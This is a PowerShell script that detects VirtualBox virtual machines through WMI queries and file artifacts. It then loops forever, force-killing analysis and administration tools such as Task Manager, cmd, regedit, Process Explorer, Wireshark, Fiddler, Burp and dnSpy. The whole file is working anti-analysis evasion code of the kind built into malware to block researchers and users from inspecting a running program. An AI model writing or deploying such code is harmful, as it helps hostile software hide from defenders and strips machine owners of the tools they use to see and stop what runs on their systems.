class AntiDebug {
    [string]$sys
    [string]$bio
    [string]$gpu
    [bool]$V
    [bool]$VB
    [bool]$VG
    [bool]$VD
    [object]$pcc
    [string]$disk

    AntiDebug() {
        $this.sys = (Get-WmiObject Win32_ComputerSystem).Model
        $this.bio = (Get-WmiObject Win32_BIOS).Version
        $this.gpu = (wmic path win32_videocontroller get caption).Trim()
        $this.pcc = Get-WmiObject Win32_PortConnector
        $this.disk = (wmic diskdrive get model).Trim()

        $this.V = $this.sys -like '*Virtual*' -or $this.sys -like '*VirtualBox*'
        $this.VB = $this.bio -like '*VBOX*'
        $this.VG = $this.gpu -match "Not Found" -or $this.gpu -match "ERROR"
        $this.VD = $this.disk -like '*VBOX HARDDISK*' -or $this.disk -like '*VBOX*'
    }

    [void]Check() {
        if ($this.V) {
            Write-Host "[-] This system appears to be a virtual machine." -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed System Model Check" -ForegroundColor Green
        }

        if ($this.VB) {
            Write-Host "[-] The BIOS version indicates this may be a VirtualBox virtual machine. Please check your environment." -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed BIOS Version Check" -ForegroundColor Green
        }

        if ($this.VG) {
            Write-Host "[-] GPU information not available or an error occurred." -ForegroundColor Red
        }
        else {
            Write-Host "[+] Passed GPU Check" -ForegroundColor Green
        }

        if ($this.pcc) {
            Write-Host "[+] Passed PortConnector Check" -ForegroundColor Green
        }
        else {
            Write-Host "[-] Please Don't run this program in a virtual environment" -ForegroundColor Red
        }

        if (Test-Path "C:\vboxpostinstall.log") {
            Write-Host "[+] Found vboxpostinstall.log in C:\" -ForegroundColor Yellow
        }

        if (Test-Path "C:\Users\vboxuser") {
            Write-Host "[-] Found vboxuser folder in C:\Users\vboxuser" -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed User Test" -ForegroundColor Green
        }

        if ($this.VD) {
            Write-Host "[-] The disk drive model indicates this may be a VirtualBox virtual machine." -ForegroundColor Yellow
        }
        else {
            Write-Host "[+] Passed Disk Drive Model Check" -ForegroundColor Green
        }

        $this.antidebugproccess()
        Read-Host "Press Enter to exit"
    }

    [void] antidebugproccess() {
        $2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')
        
        while ($true) {
            foreach ($prg in $2kill) {
                $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
                if ($rprc) {
                    Stop-Process -Name $prg -Force 
                    Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
                }
            }
            Start-Sleep -Seconds 2
        }
    }
}

$antiDebug = [AntiDebug]::new()
$antiDebug.Check()
